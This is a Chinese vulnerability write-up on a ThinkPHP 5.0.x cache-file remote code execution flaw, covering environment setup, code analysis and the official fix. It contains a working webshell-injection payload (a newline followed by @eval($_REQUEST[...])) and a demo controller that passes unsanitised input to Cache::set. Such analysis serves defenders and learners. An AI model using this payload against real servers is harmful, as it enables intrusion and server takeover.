# ThinkPHP5.0.x 远程代码执行

Author: H3rmesk1t

Data: 2021.08.16

# 漏洞概要
- 本次漏洞存在于 ThinkPHP 的缓存类中。该类会将缓存数据通过序列化的方式，直接存储在 .php 文件中，攻击者通过精心构造的 payload ，即可将 webshell 写入缓存文件。缓存文件的名字和目录均可预测出来，一旦缓存目录可访问或结合任意文件包含漏洞，即可触发 远程代码执行漏洞
- 漏洞影响版本： 
5.0.0<=ThinkPHP5<=5.0.10

# 初始配置
获取测试环境代码

```bash
composer create-project --prefer-dist topthink/think=5.0.10 tpdemo
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/367b733b84ce4ed485b21e0afd629fa9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

将 composer.json 文件的 require 字段设置成如下

```bash
"require": {
    "php": ">=5.4.0",
    "topthink/framework": "5.0.10"
},
```

然后执行 `composer update` ，并将 `application/index/controller/Index.php` 文件代码设置如下

![在这里插入图片描述](https://img-blog.csdnimg.cn/6d3f889d805743e98da38af535401987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
<?php
namespace app\index\controller;
use think\Cache;
class Index
{
    public function index()
    {
        Cache::set("name",input("get.username"));
        return '<style type="text/css">*{ padding: 0; margin: 0; } .think_default_text{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"<h1>:)</h1><pThinkPHP V5<br/><span style="font-size:30px">十年磨一剑 - 为API开发设计的高性能框架</span></p><span style="font-size:22px;">[ V5.0 版本由 <a href="http://www.qiniu.com" target="qiniu">七牛云</a独家赞助发布 ]</span></div><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_bd568ce7058a1091"></thinkad>';
    }
}
?>
```
# 漏洞利用

Payload

```bas
http://127.0.0.1/cms/public/index.php?username=H3rmesk1t%0d%0a@eval($_REQUEST[d1no]);//
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b22f06b4988d4551aff167b951cd61d5.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/7a818445aaaf4618b4c73d39c01eddcf.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 漏洞分析

跟进 `Cache` 类的 `set` 方法，发现其先通过单例模式 `init` 方法，创建了一个类实例，该类由 `cache` 的配置项 `type` 决定，默认情况下其值为 `File` ，在本例中 `self::$handler` 即为 `think\cache\driver\File` 类实例

![在这里插入图片描述](https://img-blog.csdnimg.cn/6d03e14650ec43808eb2f6cf3d2d4272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/5e9f26f0e86c4cf0a0b4d80b7059682a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/c4818b22818a404d88246d5fa9be73ef.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

在 `thinkphp/library/think/cache/driver/` 目录下可以看到 Thinkphp5 支持的几种缓存驱动类，接着上面的分析，程序调用 `think\cache\driver\File` 类的 `set` 方法，可以看到 `data` 数据没有经过任何处理，只是序列化后拼接存储在文件中，这里的 `$this->options['data_compress']` 变量默认情况下为 `false` ，所以数据不会经过 `gzcompress` 函数处理，虽然在序列化数据前面拼接了单行注释符 `//` ，但是我们可以通过注入换行符绕过该限制

![在这里插入图片描述](https://img-blog.csdnimg.cn/c608b06ace83450d93e3ed4050d754ba.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/d76f13392544417d9f3966bf1f141fea.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

来看看缓存文件的名字是如何生成的，从前面可以看到文件名是通过调用 `getCacheKey` 方法获得的，跟进该方法可以看到缓存文件的子目录和文件名均和缓存类设置的键有关（如本例中缓存类设置的键为 name ），程序先获得键名的 `md5` 值，然后将该 `md5` 值的前 `2` 个字符作为缓存子目录，后 30 字符作为缓存文件名，如果应用程序还设置了前缀 `$this->options['prefix']` ，那么缓存文件还将多一个上级目录

![在这里插入图片描述](https://img-blog.csdnimg.cn/bda2a2f3afaa4888911fd95d2284c389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

这个漏洞要想利用成功，得知道缓存类所设置的键名，这样才能找到 `webshell` 路径；其次如果按照官方说明开发程序， `webshell` 最终会被写到 `runtime` 目录下，而官方推荐 `public` 作为 web 根目录，所以即便写入了 `shell` ，也无法直接访问到；最后如果程序有设置 `$this->options['prefix']` 的话，在没有源码的情况下还是无法获得 `webshell` 的准确路径

# 漏洞修复

官方的修复方法是：将数据拼接在 `php` 标签之外，并在 `php` 标签中拼接 `exit()` 函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/503b5156d7114ab982a5f6afb639546d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 攻击总结

参考Mochazz师傅的审计流程

![在这里插入图片描述](https://img-blog.csdnimg.cn/e5f1f064247d4bde85e8d6ca043f6b09.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
